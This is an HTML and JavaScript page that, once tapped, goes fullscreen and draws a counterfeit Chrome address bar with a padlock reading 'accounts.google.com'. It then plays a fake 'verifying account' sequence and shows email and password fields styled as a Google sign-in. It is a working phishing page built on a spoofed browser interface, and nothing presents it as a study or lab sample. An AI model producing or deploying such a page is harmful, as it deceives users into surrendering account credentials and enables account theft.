<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Loading...</title>

<style>
html, body {
    margin:0;
    padding:0;
    font-family: Arial, sans-serif;
    background:white;
}

/* START SCREEN */
#start {
    position:fixed;
    width:100%;
    height:100%;
    display:flex;
    justify-content:center;
    align-items:center;
    font-size:20px;
    background:white;
    z-index:10000;
}

/* BLANK SCREEN */
#blank {
    position:fixed;
    width:100%;
    height:100%;
    background:white;
    z-index:9998;
    display:none;
}

/* FAKE CHROME BAR */
#fakebar {
    position:fixed;
    top:0;
    left:0;
    width:100%;
    height:56px;
    background:#f1f3f4;
    display:flex;
    align-items:center;
    padding:0 10px;
    box-shadow:0 1px 2px rgba(0,0,0,0.2);
    z-index:9999;
    opacity:0;
    transition:0.3s;
}

#fakebar.show {
    opacity:1;
}

/* URL FIELD */
.url {
    background:white;
    border-radius:20px;
    padding:6px 12px;
    border:1px solid #ccc;
    flex:1;
    font-size:14px;
    color:#444;
}

/* CONTENT */
#content {
    display:none;
    padding-top:100px;
    text-align:center;
    opacity:0;
    transition:0.4s;
}

input {
    margin-top:20px;
    width:80%;
    padding:12px;
    font-size:16px;
    border-radius:25px;
    border:1px solid #ccc;
}
</style>
</head>

<body>

<div id="start">Tap to Continue</div>
<div id="blank"></div>

<div id="fakebar">
    🔒 <div class="url">accounts.google.com</div>
</div>

<div id="content">
    <h2>Checking session...</h2>
    <p id="status">Please wait</p>
</div>

<script>
let start = document.getElementById("start");
let blank = document.getElementById("blank");
let fakebar = document.getElementById("fakebar");
let content = document.getElementById("content");
let status = document.getElementById("status");

start.addEventListener("click", async () => {
    try {
        await document.documentElement.requestFullscreen();

        start.style.display = "none";

        // blank distraction
        blank.style.display = "block";

        setTimeout(() => {

            blank.style.display = "none";

            // tampilkan fake bar
            fakebar.classList.add("show");

            // tampilkan konten
            content.style.display = "block";

            setTimeout(() => {
                content.style.opacity = 1;
            }, 50);

            // fake loading flow
            setTimeout(() => {
                status.innerText = "Verifying account...";
            }, 1000);

            setTimeout(() => {
                content.innerHTML = `
                    <h2>Sign in</h2>
                    <input placeholder="Email"><br>
                    <input type="password" placeholder="Password">
                `;
            }, 2200);

        }, 1200); // timing penting

    } catch (e) {
        alert("Fullscreen blocked");
    }
});
</script>

</body>
</html>
